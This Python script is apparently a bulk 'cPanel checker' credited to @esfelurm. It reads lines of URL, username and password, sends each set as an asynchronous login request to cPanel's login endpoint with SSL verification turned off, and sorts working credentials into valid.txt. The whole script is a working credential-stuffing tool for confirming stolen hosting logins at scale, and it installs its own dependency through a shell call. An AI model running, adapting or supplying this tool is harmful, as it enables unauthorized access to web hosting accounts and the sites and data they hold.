import os
import asyncio
from platform import system

rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn, k,g = '\033[00;36m', '\033[90m','\033[38;5;130m'

def clear():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        from colorama import init
        init
        os.system('cls')

try :
    import aiohttp
except ImportError :
    os.system("pip install aiohttp")

async def login_cpanel(url : str, username :str, pwd :str, success_file :str  , failed_file :str) -> None:
    try:
        async with aiohttp.ClientSession() as session:
            login_url = f"{url}/login/?login_only=1"
            login_data = {'user': username, 'pass': pwd}

            async with session.post(login_url, data=login_data, allow_redirects=True, ssl=False,timeout=10) as response:
                data = await response.text()

                if "security_token" in data:
                    print(f"{cn}------------------------------\n{lrd}[{lgn}+{lrd}]{gn} cPanel Login Successful ! :{lgn} {url}\n{k}Username : {lgn}{username}\n{k}Password : {lgn}{pwd}\n{cn}------------------------------")

                    with open(success_file, 'a') as success_output:
                        success_output.write(f"{url}|{username}|{pwd}\n")
                else:
                    print(f"{rd}------------------------------\n{lrd}[{rd}-{lrd}]{rd} cPanel Login Failed !\n{rd}------------------------------")

                    with open(failed_file, 'a') as failure_output:
                        failure_output.write(f"{url}|{username}|{pwd}\n")
                if response.history:
                    await login_cpanel(response.url, username, pwd, success_file, failed_file)

    except Exception as e:
        print(f"{rd}Error during login:{lrd} {e}")
        with open(failed_file, 'a') as failure_output:
            failure_output.write(f"{url}|{username}|{pwd}\n")

async def process_file(file_path: str,success_file: str, failed_file: str) -> None :

    try:
        with open(file_path, 'r',encoding='utf-8') as file:
            lines = file.readlines()

        tasks = []
        for line in lines:
            parts = line.strip().split('|')
            if len(parts) == 3:
                cpanel_url, cpanel_username, cpanel_password = parts
                task = login_cpanel(cpanel_url, cpanel_username, cpanel_password, success_file, failed_file)
                tasks.append(task)
            else:
                print(f"{rd}Invalid format in line:{lrd} {line}")

        await asyncio.gather(*tasks)

    except Exception as e:
        print(f"{rd}Error processing file: {lrd}{e}")

def banner() -> None:
    print(f"""{k}
                                                                
                                                                
    //   ) )                                                    
   //            ___        ___         __        ___       //  
  //           //   ) )   //   ) )   //   ) )   //___) )   //   
 //           //___/ /   //   / /   //   / /   //         //    
((____/ /    //         ((___( (   //   / /   ((____     //     

    {pe}CPANEL CHECKER {cn}Git & tg: @esfelurm
    {rd}Ex File : https://example.com|user|pass

""")
 

async def main() -> None:
    clear()
    banner()
    file_path = input(f"{lrd}[{lgn}+{lrd}]{gn} Enter the file name: {cn}")
    success_file = "valid.txt"
    failed_file = "invalid.txt"

    await process_file(file_path, success_file, failed_file)

if __name__ == "__main__":
    asyncio.run(main())
